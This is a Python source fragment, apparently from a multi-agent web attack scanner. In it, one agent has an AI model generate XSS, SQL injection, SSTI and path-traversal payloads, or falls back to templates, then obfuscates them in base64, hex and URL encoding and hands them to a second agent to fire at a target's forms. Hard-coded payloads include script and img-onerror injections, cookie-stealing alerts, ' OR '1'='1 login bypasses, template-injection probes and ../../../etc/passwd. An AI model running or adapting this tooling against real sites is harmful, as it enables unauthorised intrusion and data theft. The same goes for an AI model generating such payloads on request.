        # 1. CONTEXT AWARE GENERATION
        generated_payloads = []

        # Try AI First (Cortex NVIDIA/Ollama) with Master Prompt Guardrails
        if self.ai and self.ai.enabled:
            logger.debug(f"[{self.name}] >> CORTEX AI: Generating context-aware payloads via NVIDIA/Ollama...")

            # INJECT: Xytherion Master Prompt (DEFINE -> ROAST -> REFINE)
            master_guard = "MASTER RULE: You must NOT hallucinate endpoints. Only generate payloads valid for the observed API behavior."
            if packet.config.params and "semantic_state" in packet.config.params:
                master_guard += f" OBSERVED DOM ACTIONS: {packet.config.params['semantic_state']['actions_mapped']}."

            try:
                ai_payloads = await self.ai.generate_attack_payloads(
                    target_url=packet.target.url,
                    attack_types=["XSS", "SQLi", "SSTI", "Path Traversal"],
                    contextual_notes=master_guard,
                    scan_ctx=getattr(self.bus, "scan_contexts", {}).get(event.scan_id),
                )
                if ai_payloads:
                    generated_payloads.extend(ai_payloads)
                    logger.debug(f"[{self.name}] >> CORTEX AI: Generated {len(ai_payloads)} ROAST-validated payloads.")
            except Exception as e:
                logger.warning(f"[{self.name}] CORTEX AI Failure. Falling back to templates: {e}")

        # Fallback to Templates if AI produced nothing
        if not generated_payloads:
            context = {"context_var": "XSS_BY_SIGMA", "context_table": "admin_creds", "cmd": "id"}
            for template in self.payload_templates:
                raw_payload = template.format(**context)
                generated_payloads.append(raw_payload)

        # 2. OBFUSCATION ENGINE (Applies to all)
        final_payloads = []
        for raw in generated_payloads:
            final_payloads.append(raw)
            # Add variants
            final_payloads.append(self.obfuscate(raw, "base64"))
            final_payloads.append(self.obfuscate(raw, "hex"))
            final_payloads.append(self.obfuscate(raw, "url"))

        # Publish Results (The "Weapon Shipment")
        await self.bus.publish(
            HiveEvent(
                type=EventType.JOB_COMPLETED,
                source=self.name,
                scan_id=event.scan_id,
                payload={
                    "job_id": packet.id,
                    "status": "SUCCESS",
                    "target_url": packet.target.url,
                    # Pass the seeder's auth context through to Beta so the
                    # weapon shipment lands on an authenticated session, not the
                    # DVWA login redirect.
                    "target_headers": dict(packet.target.headers or {}),
                    "data": {"generated_payloads": final_payloads},
                },
            )
        )
        logger.info(f"[{self.name}] Forged {len(final_payloads)} SOTA payloads.")

        # BUG 6 FIX: Explicitly hand off payloads to Beta for execution
        beta_handoff = JobPacket(
            priority=TaskPriority.HIGH,
            target=TaskTarget(url=packet.target.url, headers=dict(packet.target.headers or {})),
            config=ModuleConfig(
                module_id="sigma_payload_handoff", agent_id=AgentID.BETA, params={"payloads": final_payloads}
            ),
        )
        await self.bus.publish(
            HiveEvent(
                type=EventType.JOB_ASSIGNED, source=self.name, scan_id=event.scan_id, payload=beta_handoff.model_dump()
            )
        )

    def obfuscate(self, payload: str, method: str) -> str:
        if method == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif method == "hex":
            return "".join([hex(ord(c)) for c in payload])
        elif method == "url":
            return urllib.parse.quote(payload)
        return payload

    # ============ BROWSER-AWARE PAYLOAD GENERATION (Phase 2) ============

    async def _generate_browser_aware_payloads(self, url: str, scan_id: str) -> list:
        """Generate payloads based on actual DOM structure and forms."""
        try:
            logger.debug(f"[{self.name}] Analyzing DOM structure for browser-aware payloads...")

            # Analyze DOM structure
            dom_structure = await self._analyze_dom_structure(url)

            if not dom_structure:
                return []

            payloads = []

            # Generate form-specific payloads
            for form in dom_structure.get("forms", []):
                form_payloads = await self._generate_form_specific_payloads(form, url)
                payloads.extend(form_payloads)

            # Generate framework-specific payloads
            framework = dom_structure.get("framework")
            if framework:
                framework_payloads = self._generate_framework_payloads(framework, url)
                payloads.extend(framework_payloads)

            logger.debug(f"[{self.name}] Generated {len(payloads)} browser-aware payloads")

            return payloads

        except Exception as e:
            logger.warning(f"[{self.name}] Browser-aware payload generation failed: {e}")
            return []

    async def _analyze_dom_structure(self, url: str) -> dict:
        """Analyze DOM structure to understand forms, inputs, and framework."""
        try:
            logger.debug(f"[{self.name}] Analyzing DOM structure for: {url}")

            # Navigate to page using browser
            nav_result = await self.browser.navigate(url, stealth=False)

            if not nav_result.get("success"):
                logger.warning(f"[{self.name}] Navigation failed for DOM analysis")
                return {}

            # Detect framework
            framework = await self.browser.detect_framework(url)

            dom_details = await self.browser.analyze_dom(url)
            dom_structure = {
                "framework": framework,
                "forms": dom_details.get("forms", []) if isinstance(dom_details, dict) else [],
                "inputs": dom_details.get("inputs", []) if isinstance(dom_details, dict) else [],
                "buttons": dom_details.get("buttons", []) if isinstance(dom_details, dict) else [],
                "scripts": [],
                "url": url,
            }

            logger.debug(f"[{self.name}] DOM analysis complete. Framework: {framework}")

            return dom_structure

        except Exception as e:
            logger.warning(f"[{self.name}] DOM analysis failed: {e}")
            return {}

    async def _generate_form_specific_payloads(self, form: dict, url: str) -> list:
        """Generate payloads targeted at specific form fields."""
        payloads = []

        try:
            form.get("action", url)
            form.get("method", "POST")

            for input_field in form.get("inputs", []):
                field_name = input_field.get("name", "")
                field_type = input_field.get("type", "text")

                # Generate payloads based on field type
                if field_type == "email":
                    payloads.extend(
                        [
                            f"{field_name}=test@example.com<script>alert(1)</script>",
                            f"{field_name}=test@example.com'><img src=x onerror=alert(1)>",
                            f"{field_name}=admin@localhost",
                        ]
                    )
                elif field_type == "password":
                    payloads.extend(
                        [
                            f"{field_name}=' OR '1'='1",
                            f"{field_name}=admin' --",
                            f"{field_name}=<script>alert(document.cookie)</script>",
                        ]
                    )
                elif field_type == "number":
                    payloads.extend(
                        [
                            f"{field_name}=-1",
                            f"{field_name}=999999999",
                            f"{field_name}=0.0001",
                            f"{field_name}=1' OR '1'='1",
                        ]
                    )
                elif field_type == "search":
                    payloads.extend(
                        [
                            f"{field_name}=<script>alert(1)</script>",
                            f"{field_name}={{{{7*7}}}}",
                            f"{field_name}=${{7*7}}",
                        ]
                    )
                else:  # text, textarea, etc.
                    payloads.extend(
                        [
                            f"{field_name}=<script>alert(1)</script>",
                            f"{field_name}=' OR 1=1--",
                            f"{field_name}=../../../etc/passwd",
                            f"{field_name}={{{{config}}}}",
                        ]
                    )

        except Exception as e:
            logger.warning(f"[{self.name}] Form-specific payload generation failed: {e}")

        return payloads

    def _generate_framework_payloads(self, framework: str, url: str) -> list:
        """Generate framework-specific exploit payloads."""
        payloads = []

        if framework == "react":
            payloads.extend(
                [
                    "?search=javascript:alert(1)",
                    "?redirect=javascript:alert(document.domain)",
                    "?dangerouslySetInnerHTML=<img src=x onerror=alert(1)>",
                    "?__html=<script>alert(1)</script>",
                ]
            )
        elif framework == "vue":
            payloads.extend(
                [
                    "?v-html=<img src=x onerror=alert(1)>",
                    "?{{constructor.constructor('alert(1)')()}}",
                    "?search={{7*7}}",
                ]
            )
        elif framework == "angular":
            payloads.extend(
                [
                    "?search={{constructor.constructor('alert(1)')()}}",
                    "?{{$on.constructor('alert(1)')()}}",
                    "?search={{7*7}}",
                ]
            )

        return payloads

    async def _test_payload_browser(self, url: str, payload: str, scan_id: str) -> dict:
        """Pre-test payload in browser before mass deployment."""
        try:
            logger.debug(f"[{self.name}] Pre-testing payload in browser: {payload[:50]}...")

            # Test payload using browser
            result = await self.browser.test_payload(url, payload)

            if result.get("triggered"):
                logger.debug(f"[{self.name}] [PRE-TEST SUCCESS] Payload effective: {payload[:50]}")

                # Capture evidence
                await self.forensics.capture_screenshot(
                    scan_id=scan_id, context=result.get("context"), engine="openclaw", label="payload_pretest"
                )

                return {"effective": True, "payload": payload, "evidence": "Payload triggered in browser pre-test"}

            return {"effective": False, "payload": payload}

        except Exception as e:
            logger.warning(f"[{self.name}] Payload pre-test failed: {e}")
            return {"effective": False, "payload": payload, "error": str(e)}
